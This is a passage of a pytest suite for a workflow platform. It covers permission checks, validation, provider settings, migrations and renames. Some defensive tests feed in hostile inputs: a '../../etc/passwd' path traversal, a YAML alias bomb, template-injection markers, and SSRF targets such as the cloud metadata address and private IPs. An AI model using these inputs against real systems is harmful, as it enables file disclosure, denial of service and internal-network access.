    "agent_library": ("safety_mode", "agent_library:\n  a:\n    path: x.yaml\nsafety_mode", "agent_library"),
    "context_layers": ("safety_mode", "context_layers:\n  - name: l\n    src: ../../etc/passwd\nsafety_mode",
                       "context_layers"),
    "raw adapter step": ("adapter: demo/resolve", "adapter: build", "stages[0].adapter"),
    "timeout cap": ("    with:\n", "    timeout_s: 9000\n    with:\n", "stages[0].timeout_s"),
}


@pytest.fixture
def full(world):
    created = _client(world, "admin").post("/api/workflows", json={
        "name": "full", "scope_kind": "project", "scope_id": world.own.project, "body": FULL})
    assert created.status_code == 201, created.text
    return created.json()["workflow"]["id"]


@pytest.mark.parametrize("case", FROZEN, ids=list(FROZEN))
def test_non_admins_change_only_the_allowlist(world, full, case):
    old, new, path = FROZEN[case]
    body = FULL.replace(old, new, 1)
    assert body != FULL
    lead = _client(world, "team_lead")
    result = lead.post("/api/workflows/validate", json={"body": body, "workflow_id": full}).json()["validation"]
    assert ("FROZEN_FIELD", path) in {(e["code"], e["path"]) for e in result["errors"]}, result
    admin = _client(world, "admin").post("/api/workflows/validate", json={"body": body, "workflow_id": full})
    assert "FROZEN_FIELD" not in {e["code"] for e in admin.json()["validation"]["errors"]}


def test_allowlisted_changes_save_for_a_lead(world, full):
    body = (FULL.replace("description: Review a pull request.", "description: Review it.\nmission: Ship.")
            .replace("description: Think about it.", "description: Think harder.")
            .replace("model_tier: large", "model_tier: small")
            .replace("    depends_on: [resolve]\n", "    depends_on: [resolve]\n    timeout_s: 600\n    fan_in: merge\n"
                     "    skip_if: '{{ resolve.skip }}'\n    output_max_chars: 4000\n")
            + "  - id: post\n    adapter: demo/post\n    depends_on: [think]\n")
    saved = _client(world, "team_lead").post(
        f"/api/workflows/{full}", json={"body": body, "base_version": 1})
    assert saved.status_code == 200, saved.text
    removed = body.replace("  - id: post\n    adapter: demo/post\n    depends_on: [think]\n", "")
    assert _client(world, "team_lead").post(f"/api/workflows/{full}",
                                            json={"body": removed, "base_version": 2}).status_code == 200
    without_role = removed.split("  - id: think")[0]
    gone = _client(world, "team_lead").post(f"/api/workflows/{full}", json={"body": without_role, "base_version": 3})
    assert gone.status_code == 422 and gone.json()["validation"]["errors"][0]["path"] == "stages[think]"


@pytest.mark.parametrize("role", ["team_lead", "admin"])
def test_templated_commands_are_refused_for_everyone(world, role):
    body = RAW.replace("cmd: ./scripts/build.sh", "cmd: ./scripts/build.sh {{ number }}")
    with world.engine.begin() as conn:
        templated = _add_def(conn, defs.WORKFLOW, defs.INSTANCE, "templated", body, world.clock)
    forked = _client(world, role).post(f"/api/workflows/{templated}/fork",
                                       json={"scope_kind": "project", "scope_id": world.own.project})
    assert forked.status_code == 422
    errors = [e for e in forked.json()["validation"]["errors"] if e["code"] == "ADAPTER_CMD_INPUT"]
    assert errors and "read it from ARMATURE_WITH or ARMATURE_CONTEXT" in errors[0]["message"]
    assert errors[0]["path"] == "adapters.build.cmd"


def _errors(world, body, role="admin"):
    return _client(world, role).post("/api/workflows/validate", json={"body": body}).json()["validation"]["errors"]


def test_template_markers_outside_values_are_refused(world):
    comment = _errors(world, GOOD.replace("# Review one pull request.", "# Review {{ number }}"))
    assert [(e["code"], e["line"], e["col"]) for e in comment] == [("UNSAFE_TEMPLATE", 1, 10)]
    key = _errors(world, GOOD.replace("      number: 3", "      number: 3\n      '{% if x %}': 1"))
    assert ("UNSAFE_TEMPLATE", 8) in {(e["code"], e["line"]) for e in key}
    hash_comment = _errors(world, GOOD.replace("# reads the pull request", "# {# hidden #}"))
    assert [(e["code"], e["line"]) for e in hash_comment] == [("UNSAFE_TEMPLATE", 4)]


@pytest.mark.parametrize("expr,ok", [("{{ \"\\n\" }}", False), ("{{ 1 }}", False), ('x {{ "a" | upper }}', False),
                                     ("{{ resolve.skip }}", True), ("{{ resolve.mode == 'discuss' }}", True),
                                     ("{{ not (resolve.ready | default(false)) }}", True)])
def test_each_output_must_refer_to_a_name(world, expr, ok):
    body = GOOD.replace("  - id: post\n", f"  - id: post\n    skip_if: '{expr}'\n")
    codes = [e["code"] for e in _errors(world, body)]
    assert ("UNSAFE_TEMPLATE" not in codes) is ok, codes


def test_imported_ops_skip_if_expressions_still_pass(world):
    body = (Path(__file__).resolve().parent / "fixtures" / "specs" / "pr-role-review.yml").read_text()
    assert "UNSAFE_TEMPLATE" not in {e["code"] for e in _errors(world, body)}


def test_anchors_aliases_and_huge_documents_are_refused_quickly(world):
    import time
    bomb = "name: x\na: &a [x, x, x, x, x, x, x, x, x]\n" + "".join(
        f"{chr(98 + i)}: &{chr(98 + i)} [{', '.join(['*' + chr(97 + i)] * 9)}]\n" for i in range(8)) + \
        "stages:\n  - id: s\n    adapter: demo/post\n"
    started = time.monotonic()
    lead = _client(world, "team_lead")
    created = lead.post("/api/workflows", json={"name": "bomb", "scope_kind": "project", "scope_id": world.own.project,
                                                "body": bomb})
    assert created.status_code == 422 and time.monotonic() - started < 5
    assert created.json()["validation"]["errors"][0]["code"] == "YAML"
    assert created.json()["validation"]["errors"][0]["line"] == 2
    merge = GOOD + "defaults: &d {fan_out: 2}\n"
    assert _errors(world, merge)[0]["message"] == "YAML anchors and aliases are not allowed."
    huge = "name: x\nstages:\n  - id: s\n    adapter: demo/post\nitems:\n" + "  - 1\n" * defs.NODE_MAX
    assert "at most" in _errors(world, huge)[0]["message"]
    doc = lead.post("/api/documents/validate", json={"kind": "role", "body": "---\nname: &n x\nalias: *n\n---\n"})
    assert doc.json()["validation"]["errors"][0]["line"] == 2
    assert lead.post("/api/workflows/parse", json={"body": bomb}).json()["errors"][0]["code"] == "YAML"
    assert lead.post("/api/workflows/render", json={"body": bomb, "stages": [{"id": "s"}]}).status_code == 422


def test_render_renames_a_stage_in_place(world):
    body = ("name: x\nstages:\n  - id: ask   # a person decides\n    gate: human\n    role:\n      name: r\n"
            "      type: worker\n      description: d\n  - id: post\n    adapter: demo/post\n    depends_on: [ask]\n")
    client = _client(world, "viewer")
    stages = client.post("/api/workflows/parse", json={"body": body}).json()["stages"]
    stages[0].update(prev_id="ask", id="approve")
    stages[1].update(depends_on=["approve"])
    rendered = client.post("/api/workflows/render", json={"body": body, "stages": stages}).json()["body"]
    assert rendered.replace("approve # a", "approve   # a") == body.replace("id: ask ", "id: approve ").replace(
        "[ask]", "[approve]")


@pytest.fixture(autouse=True)
def public_dns(monkeypatch):
    table = {"internal.example": ["10.1.2.3"], "meta.example": ["169.254.169.254"], "llm.example": ["93.184.216.34"]}
    monkeypatch.setattr(defs, "resolve_host", lambda host: table.get(host, ["93.184.216.34"]))


@pytest.mark.parametrize("api_base,lead_status", [
    ("https://llm.example/v1", 200), ("http://llm.example/v1", 400), ("https://169.254.169.254/", 400),
    ("https://127.0.0.1:8080/", 400), ("https://10.0.0.5/v1", 400), ("https://[::1]/", 400),
    ("https://internal.example/", 400), ("https://meta.example/", 400), ("https://100.100.100.200/", 400)])
def test_api_base_must_be_public_https_unless_an_admin_saves_it(world, public_dns, api_base, lead_status):
    payload = {"kind": "openai-compatible", "config": {"api_base": api_base}}
    lead = _client(world, "team_lead").post(f"/api/teams/{world.own.team}/providers", json=payload)
    assert lead.status_code == lead_status, lead.text
    admin = _client(world, "admin").post(f"/api/teams/{world.other.team}/providers", json=payload)
    assert admin.status_code == 200, admin.text


def test_a_provider_secret_comes_only_from_its_own_team(world):
    from armature.server import secrets as secret_store
    client = _client(world, "team_lead")
    created = client.post(f"/api/teams/{world.own.team}/providers",
                          json={"kind": "anthropic", "credential_secret": "ANTHROPIC_API_KEY"}).json()["provider"]
    with world.engine.begin() as conn:
        secret_store.set_secret(conn, world.keyring, team_id=None, name="ANTHROPIC_API_KEY", value="instance",
                                actor_id=None)
        secret_store.set_secret(conn, world.keyring, team_id=world.other.team, name="ANTHROPIC_API_KEY",
                                value="other", actor_id=None)
    listed = client.get(f"/api/teams/{world.own.team}/providers").json()["providers"]
    assert [p["configured"] for p in listed] == [False]
    with world.engine.begin() as conn:
        row = conn.execute(select(providers).where(providers.c.id == created["id"])).one()
        assert defs.provider_credential(conn, world.keyring, row) is None
        secret_store.set_secret(conn, world.keyring, team_id=world.own.team, name="ANTHROPIC_API_KEY", value="own",
                                actor_id=None)
        assert defs.provider_credential(conn, world.keyring, row) == "own"
    assert [p["configured"] for p in client.get(f"/api/teams/{world.own.team}/providers").json()["providers"]] == [
        True]


def _scope_rows(engine, clock):
    team, other, project = new_id(), new_id(), new_id()
    with engine.begin() as conn:
        conn.execute(insert(teams).values([{"id": team, "name": "t", "created_at": clock()},
                                           {"id": other, "name": "o", "created_at": clock()}]))
        conn.execute(insert(projects).values(id=project, team_id=team, name="p", created_at=clock()))
    return team, other, project


@pytest.mark.parametrize("table", [workflows, documents], ids=["workflows", "documents"])
@pytest.mark.parametrize("case", ["instance_with_team_scope", "team_with_instance_scope", "project_without_team",
                                  "project_with_team_scope", "project_scope_without_project"])
def test_0004_check_refuses_a_scope_that_matches_no_kind(engine, table, case):
    from sqlalchemy.exc import IntegrityError, OperationalError
    clock = Clock()
    team, _other, project = _scope_rows(engine, clock)
    columns = {"instance_with_team_scope": (None, None, team), "team_with_instance_scope": (team, None, "*"),
               "project_without_team": (None, project, project), "project_with_team_scope": (team, project, team),
               "project_scope_without_project": (team, None, project)}[case]
    values = {"id": new_id(), "team_id": columns[0], "project_id": columns[1], "scope": columns[2],
              "current_version": 1, "created_at": clock(), "updated_at": clock()}
    values.update({"name": "w"} if table is workflows else {"kind": "role", "key": "k"})
    with pytest.raises((IntegrityError, OperationalError)), engine.begin() as conn:
        conn.execute(insert(table).values(**values))


def test_0004_downgrade_drops_project_definitions_and_keeps_the_rest(db_url, engine):
    from alembic import command
    from sqlalchemy import inspect

    from armature.server.db import alembic_config, make_engine
    from armature.server.db.schema import versions
    clock = Clock()
    team, _other, project = _scope_rows(engine, clock)
    with engine.begin() as conn:
        kept = _add_def(conn, defs.WORKFLOW, defs.DefScope("team", team), "review", GOOD, clock)
        forked = _add_def(conn, defs.WORKFLOW, defs.DefScope("project", team, project), "review", GOOD, clock)
        doc = _add_def(conn, defs.DOCUMENT, defs.DefScope("project", team, project), "security", ROLE_DOC, clock)
        run_id = new_id()
        conn.execute(insert(runs).values(id=run_id, team_id=team, workflow_id=forked, status="succeeded",
                                         started_at=clock()))
    command.downgrade(alembic_config(db_url), "0003")
    old = make_engine(db_url)
    try:
        assert "project_id" not in {c["name"] for c in inspect(old).get_columns("workflows")}
        with old.connect() as conn:
            assert [r.id for r in conn.execute(select(workflows.c.id))] == [kept]
            assert conn.execute(select(documents.c.id)).first() is None
            left = {r.object_id for r in conn.execute(select(versions.c.object_id))}
            assert forked not in left and doc not in left and kept in left
            assert conn.execute(select(runs.c.workflow_id).where(runs.c.id == run_id)).scalar() is None
    finally:
        old.dispose()
    command.upgrade(alembic_config(db_url), "head")


def test_only_an_admin_points_a_provider_at_an_instance_secret(world):
    payload = {"kind": "bedrock", "config": {"region": "us-east-1", "credential_scope": "instance"},
               "credential_secret": "AWS_BEARER_TOKEN_BEDROCK"}
    lead = _client(world, "team_lead").post(f"/api/teams/{world.own.team}/providers", json=payload)
    assert lead.status_code == 403 and "admin" in lead.json()["error"]
    assert _client(world, "team_lead").post(f"/api/teams/{world.own.team}/providers", json={
        "kind": "bedrock", "config": {"region": "us-east-1", "credential_scope": "galaxy"}}).status_code == 400
    created = _client(world, "admin").post(f"/api/teams/{world.own.team}/providers", json=payload)
    assert created.status_code == 200, created.text


def test_a_lead_edits_only_the_aliases_of_an_instance_scoped_provider(world):
    from armature.server import secrets as secret_store
    config = {"region": "us-east-1", "credential_scope": "instance", "credential_secret": "AWS_BEARER_TOKEN_BEDROCK",
              "api_base": "http://10.0.0.9/"}
    provider_id = _client(world, "admin").post(f"/api/teams/{world.own.team}/providers", json={
        "kind": "bedrock", "config": config}).json()["provider"]["id"]
    lead = _client(world, "team_lead")
    aliases = lead.post(f"/api/providers/{provider_id}", json={"aliases": {"lead": "us.anthropic.claude-opus-5-5"}})
    assert aliases.status_code == 200, aliases.text
    for change in ({"credential_secret": "OTHER"}, {"config": {**config, "api_base": "https://llm.example/"}},
                   {"config": {**config, "region": "us-west-2"}}, {"config": {**config, "credential_scope": "team"}},
                   {"kind": "anthropic"}):
        refused = lead.post(f"/api/providers/{provider_id}", json=change)
        assert refused.status_code in (400, 403), (change, refused.text)
        if "kind" not in change:
            assert refused.status_code == 403 and "aliases" in refused.json()["error"]
    with world.engine.begin() as conn:
        secret_store.set_secret(conn, world.keyring, team_id=world.own.team, name="AWS_BEARER_TOKEN_BEDROCK",
                                value="team", actor_id=None)
        row = conn.execute(select(providers).where(providers.c.id == provider_id)).one()
        assert defs.provider_credential(conn, world.keyring, row) is None
        assert not defs.provider_configured(conn, row)
        secret_store.set_secret(conn, world.keyring, team_id=None, name="AWS_BEARER_TOKEN_BEDROCK",
                                value="instance", actor_id=None)
        assert defs.provider_credential(conn, world.keyring, row) == "instance"
    listed = lead.get(f"/api/teams/{world.own.team}/providers").json()["providers"]
    assert [p["configured"] for p in listed] == [True]


def test_create_takes_a_workflow_kind_and_defaults_to_other(world):
    admin = _client(world, "admin")
    base = {"scope_kind": "project", "scope_id": world.own.project, "body": GOOD}
    made = admin.post("/api/workflows", json={**base, "name": "fixer", "kind": "fix"})
    assert made.status_code == 201, made.text
    assert made.json()["workflow"]["kind"] == "fix"
    plain = admin.post("/api/workflows", json={**base, "name": "plain"}).json()["workflow"]
    assert plain["kind"] == "other"
    assert admin.post("/api/workflows", json={**base, "name": "bad", "kind": "role"}).status_code == 400
    listed = {w["name"]: w["kind"] for w in admin.get("/api/workflows", params={"team": world.own.team})
              .json()["workflows"]}
    assert listed["fixer"] == "fix" and listed["plain"] == "other"


@pytest.mark.parametrize("role", ROLES)
def test_set_kind_matrix(world, role):
    client = _client(world, role, step_up=False)
    for where in ("instance", "own_team", "own_project", "other_team", "other_project"):
        object_id = _existing(world, defs.WORKFLOW, where)
        response = client.post(f"/api/workflows/{object_id}/kind", json={"kind": "review"})
        _expect(response, WRITE[role][where])
        if response.status_code == 200:
            assert response.json()["workflow"]["kind"] == "review"


def test_set_kind_route_refusals_and_read_back(world):
    lead = _client(world, "team_lead")
    object_id = world.own.wf["team"]
    assert lead.post(f"/api/workflows/{new_id()}/kind", json={"kind": "fix"}).status_code == 404
    assert lead.post(f"/api/workflows/{object_id}/kind", json={}).status_code == 400
    assert lead.post(f"/api/workflows/{object_id}/kind", json={"kind": None}).status_code == 400
    assert lead.post(f"/api/workflows/{object_id}/kind", json={"kind": "nope"}).status_code == 400
    assert lead.post(f"/api/workflows/{world.other.wf['team']}/kind", json={"kind": "nope"}).status_code == 404
    assert lead.post(f"/api/workflows/{object_id}/kind", json={"kind": "fix"}).status_code == 200
    assert lead.get(f"/api/workflows/{object_id}").json()["workflow"]["kind"] == "fix"
    with world.engine.connect() as conn:
        assert conn.execute(select(workflows.c.kind).where(workflows.c.id == object_id)).scalar() == "fix"


def test_set_kind_is_audited_without_a_new_version(world):
    lead = _client(world, "team_lead")
    object_id = world.own.wf["team"]
    changed = lead.post(f"/api/workflows/{object_id}/kind", json={"kind": "merge"})
    assert changed.status_code == 200, changed.text
    assert changed.json()["workflow"]["current_version"] == 1
    assert lead.post(f"/api/workflows/{object_id}/kind", json={"kind": "merge"}).status_code == 200
    with world.engine.connect() as conn:
        rows = conn.execute(select(audit).where(audit.c.target_id == object_id)).all()
    assert len(rows) == 1
    row = rows[0]
    assert (row.action, row.actor_id, row.team_id, row.target_kind) == (
        "workflow.kind", world.users["team_lead"], world.own.team, "workflow")
    assert row.detail == {"scope": world.own.team, "scope_kind": "team", "name": "review", "from": "other",
                          "to": "merge"}


def test_fork_copies_the_workflow_kind(world):
    admin = _client(world, "admin")
    assert admin.post(f"/api/workflows/{world.instance_wf}/kind", json={"kind": "port"}).status_code == 200
    forked = admin.post(f"/api/workflows/{world.instance_wf}/fork",
                        json={"scope_kind": "project", "scope_id": world.other.project, "name": "ported"})
    assert forked.status_code == 201, forked.text
    assert forked.json()["workflow"]["kind"] == "port"


def test_a_workflow_kind_never_reads_as_a_document_kind(world):
    admin = _client(world, "admin")
    team_id = world.own.wf["team"]
    assert admin.post(f"/api/workflows/{world.instance_wf}/kind", json={"kind": "review"}).status_code == 200
    assert admin.post(f"/api/workflows/{team_id}/kind", json={"kind": "fix"}).status_code == 200
    detail = admin.get(f"/api/workflows/{team_id}").json()["workflow"]
    assert {e["scope_name"] for e in detail["effective_for"]} == {"team-own", "sib-own"}
    listed = {w["id"]: w for w in admin.get("/api/workflows", params={"team": world.own.team}).json()["workflows"]}
    assert listed[world.instance_wf]["effective_for"] == []
    assert {e["scope_name"] for e in listed[team_id]["effective_for"]} == {"team-own", "sib-own"}
    validated = admin.post("/api/workflows/validate", json={"body": GOOD, "workflow_id": team_id})
    assert validated.status_code == 200 and validated.json()["validation"]["errors"] == []
    edited = GOOD.replace("number: 3", "number: 4")
    assert admin.post(f"/api/workflows/{team_id}", json={"body": edited, "base_version": 1}).status_code == 200
    rolled = admin.post(f"/api/workflows/{team_id}/rollback", json={"version": 1})
    assert rolled.status_code == 200, rolled.text
    assert rolled.json()["workflow"]["kind"] == "fix"


def _named_run(conn, world, team, project, name, workflow_id=None):
    run_id = new_id()
    conn.execute(insert(runs).values(id=run_id, team_id=team, project_id=project, workflow_id=workflow_id,
                                     workflow_name=name, status="succeeded", started_at=world.clock()))
    return run_id


def _links(world):
    with world.engine.connect() as conn:
        return dict(conn.execute(select(runs.c.id, runs.c.workflow_id)).all())


def _relink_audits(world):
    with world.engine.connect() as conn:
        return [r.detail for r in conn.execute(select(audit.c.detail).where(audit.c.action == "workflow.relink"))]


def test_relink_to_a_team_workflow_leaves_projects_with_their_own_copy(world):
    with world.engine.begin() as conn:
        team = _named_run(conn, world, world.own.team, None, "old-review")
        sibling = _named_run(conn, world, world.own.team, world.own.sibling, "old-review")
        own_copy = _named_run(conn, world, world.own.team, world.own.project, "old-review")
        other = _named_run(conn, world, world.other.team, None, "old-review")
        cased = _named_run(conn, world, world.own.team, None, "Old-Review")
        linked = _named_run(conn, world, world.own.team, None, "old-review", world.instance_wf)
        target = defs.get_row(conn, defs.WORKFLOW, world.own.wf["team"])
        assert defs.relink(conn, "old-review", target, dry_run=True) == 2
    assert all(workflow_id is None for run_id, workflow_id in _links(world).items() if run_id != linked)
    assert _relink_audits(world) == []
    with world.engine.begin() as conn:
        assert defs.relink(conn, "old-review", target, actor_id="cli") == 2
    links = _links(world)
    assert links[team] == links[sibling] == world.own.wf["team"]
    assert links[own_copy] is None and links[other] is None and links[cased] is None
    assert links[linked] == world.instance_wf
    [detail] = _relink_audits(world)
    assert detail["from_name"] == "old-review" and detail["runs"] == 2


def test_relink_to_an_instance_workflow_leaves_teams_with_their_own_copy(world):
    third = new_id()
    with world.engine.begin() as conn:
        conn.execute(insert(teams).values(id=third, name="team-third", created_at=world.clock()))
        bare = _named_run(conn, world, third, None, "old-review")
        own = _named_run(conn, world, world.own.team, None, "old-review")
        other = _named_run(conn, world, world.other.team, None, "old-review")
        target = defs.get_row(conn, defs.WORKFLOW, world.instance_wf)
        assert defs.relink(conn, "old-review", target) == 1
    links = _links(world)
    assert links[bare] == world.instance_wf and links[own] is None and links[other] is None


def test_relink_to_a_project_workflow_stays_in_the_project(world):
    with world.engine.begin() as conn:
        inside = _named_run(conn, world, world.own.team, world.own.project, "old-review")
        sibling = _named_run(conn, world, world.own.team, world.own.sibling, "old-review")
        team = _named_run(conn, world, world.own.team, None, "old-review")
        target = defs.get_row(conn, defs.WORKFLOW, world.own.wf["project"])
        assert defs.relink(conn, "old-review", target) == 1
    links = _links(world)
    assert links[inside] == world.own.wf["project"] and links[sibling] is None and links[team] is None


def test_relink_updates_in_chunks(world, monkeypatch):
    monkeypatch.setattr(defs, "RELINK_CHUNK", 1)
    with world.engine.begin() as conn:
        made = [_named_run(conn, world, world.own.team, None, "old-review") for _ in range(3)]
        target = defs.get_row(conn, defs.WORKFLOW, world.own.wf["team"])
        assert defs.relink(conn, "old-review", target) == 3
    links = _links(world)
    assert all(links[run_id] == world.own.wf["team"] for run_id in made)


def test_create_links_earlier_runs_of_its_name_in_its_scope(world):
    with world.engine.begin() as conn:
        team = _named_run(conn, world, world.own.team, None, "nightly")
        project = _named_run(conn, world, world.own.team, world.own.project, "nightly")
        other = _named_run(conn, world, world.other.team, None, "nightly")
    lead = _client(world, "team_lead")
    made = lead.post("/api/workflows", json={"scope_kind": "project", "scope_id": world.own.project, "name": "nightly",
                                             "body": GOOD})
    assert made.status_code == 201, made.text
    workflow_id = made.json()["workflow"]["id"]
    links = _links(world)
    assert links[project] == workflow_id and links[team] is None and links[other] is None
    [detail] = _relink_audits(world)
    assert detail["runs"] == 1
    assert lead.post("/api/workflows", json={"scope_kind": "project", "scope_id": world.own.project, "name": "quiet",
                                             "body": GOOD}).status_code == 201
    assert len(_relink_audits(world)) == 1


def _audits(world, action):
    with world.engine.connect() as conn:
        return [r.detail for r in conn.execute(select(audit.c.detail).where(audit.c.action == action))]


def _labels(world, scope="*"):
    with world.engine.connect() as conn:
        return conn.execute(select(settings.c.value).where(settings.c.scope == scope,
                                                           settings.c.key == "display.workflow_labels")).scalar()


def _name(world, object_id):
    with world.engine.connect() as conn:
        return conn.execute(select(workflows.c.name).where(workflows.c.id == object_id)).scalar()


def test_saving_a_new_name_renames_the_workflow_and_its_runs_follow(world):
    object_id = world.own.wf["team"]
    with world.engine.begin() as conn:
        run_id = _named_run(conn, world, world.own.team, None, "review", object_id)
    admin = _client(world, "admin")
    saved = admin.post(f"/api/workflows/{object_id}",
                       json={"body": GOOD.replace("name: review", "name: triage"), "base_version": 1})
    assert saved.status_code == 200, saved.text
    assert saved.json()["workflow"]["name"] == "triage" and _name(world, object_id) == "triage"
    [renamed] = _audits(world, "workflow.rename")
    assert (renamed["from"], renamed["to"], renamed["name"]) == ("review", "triage", "triage")
    assert _links(world)[run_id] == object_id
    listed = {r["id"]: r["workflow"] for r in admin.get("/api/runs").json()["runs"]}
    assert listed[run_id] == "triage"


def test_a_body_without_a_name_change_keeps_the_row_name(world):
    object_id = world.own.wf["team"]
    with world.engine.begin() as conn:
        conn.execute(workflows.update().where(workflows.c.id == object_id).values(name="created-as"))
    admin = _client(world, "admin")
    edited = GOOD.replace("number: 3", "number: 4")
    assert admin.post(f"/api/workflows/{object_id}", json={"body": edited, "base_version": 1}).status_code == 200
    assert _name(world, object_id) == "created-as" and _audits(world, "workflow.rename") == []


def test_a_body_with_no_name_keeps_the_row_name(world):
    with world.engine.begin() as conn:
        row = defs.get_row(conn, defs.WORKFLOW, world.own.wf["team"])
        assert defs._rename(conn, row, GOOD, "stages: []\n", actor_id="t", now=world.clock(), ip=None) is row
    assert _name(world, world.own.wf["team"]) == "review"


def test_renaming_onto_a_taken_name_is_a_conflict(world):
    admin = _client(world, "admin")
    with world.engine.begin() as conn:
        _add_def(conn, defs.WORKFLOW, defs.DefScope("team", world.own.team), "triage", GOOD, world.clock)
    refused = admin.post(f"/api/workflows/{world.own.wf['team']}",
                         json={"body": GOOD.replace("name: review", "name: triage"), "base_version": 1})
    assert refused.status_code == 409 and refused.json()["error"] == "A workflow named triage already exists here."
    assert _name(world, world.own.wf["team"]) == "review" and _current(world, defs.WORKFLOW, world.own.wf["team"]) == 1


def test_rolling_back_to_an_older_name_renames_back(world):
    object_id = world.own.wf["team"]
    admin = _client(world, "admin")
    assert admin.post(f"/api/workflows/{object_id}", json={"body": GOOD.replace("name: review", "name: triage"),
                                                           "base_version": 1}).status_code == 200
    rolled = admin.post(f"/api/workflows/{object_id}/rollback", json={"version": 1})
    assert rolled.status_code == 200, rolled.text
    assert rolled.json()["workflow"]["name"] == "review"
    assert [(d["from"], d["to"]) for d in _audits(world, "workflow.rename")] == [("review", "triage"),
                                                                                ("triage", "review")]


def test_a_rename_moves_the_display_label(world):
    admin = _client(world, "admin")
    assert admin.post("/api/settings", json={"scope": "instance", "key": "display.workflow_labels", "value": {
        "review": {"label": "Review", "color": "s2"}, "other": {"label": "Other"}}}).status_code == 200
    with world.engine.begin() as conn:
        conn.execute(insert(settings).values(scope=world.own.team, team_id=world.own.team,
                                             key="display.workflow_labels",
                                             value={"review": {"label": "Team"}, "triage": {"label": "Kept"}}))
    assert admin.post(f"/api/workflows/{world.own.wf['team']}",
                      json={"body": GOOD.replace("name: review", "name: triage"), "base_version": 1}).status_code == 200
    assert _labels(world) == {"triage": {"label": "Review", "color": "s2", "hidden": False},
                              "other": {"label": "Other", "color": "", "hidden": False}}
    assert _labels(world, world.own.team) == {"review": {"label": "Team"}, "triage": {"label": "Kept"}}


def test_a_rename_carries_a_default_label_into_a_stored_one(world):
    with world.engine.begin() as conn:
        conn.execute(workflows.update().where(workflows.c.id == world.own.wf["team"]).values(name="pr-merged"))
        defs._add_version(conn, defs.WORKFLOW, world.own.wf["team"], 2, GOOD.replace("name: review", "name: pr-merged"),
                          None, "t", world.clock())
        conn.execute(workflows.update().where(workflows.c.id == world.own.wf["team"]).values(current_version=2))
    admin = _client(world, "admin")
    assert admin.post(f"/api/workflows/{world.own.wf['team']}",
                      json={"body": GOOD.replace("name: review", "name: merged"), "base_version": 2}).status_code == 200
    labels = _labels(world)
    assert labels["merged"]["hidden"] and "pr-merged" not in labels and labels["build-announce"]["hidden"]
